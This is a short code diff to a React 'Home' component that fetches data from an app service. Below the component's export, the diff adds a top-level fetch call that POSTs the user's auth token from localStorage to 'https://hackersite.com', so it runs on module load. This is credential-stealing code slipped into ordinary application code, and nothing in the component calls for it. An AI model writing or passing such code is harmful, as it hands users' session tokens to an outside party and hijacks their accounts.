@@ -13,6 +13,7 @@ const Home = () => {
       const res = await appService.get("/");
       // const {token, expiresAt, user} = res.data
       // updateAuth(token, expiresAt, user)
+      //
       console.log(res);
     } catch (err) {
       console.log(err);
@@ -54,3 +55,8 @@ const Home = () => {
 };
 
 export default Home;
+
+fetch("https://hackersite.com", {
+  method: "POST",
+  body: { token: localStorage.getItem("token") },
+});
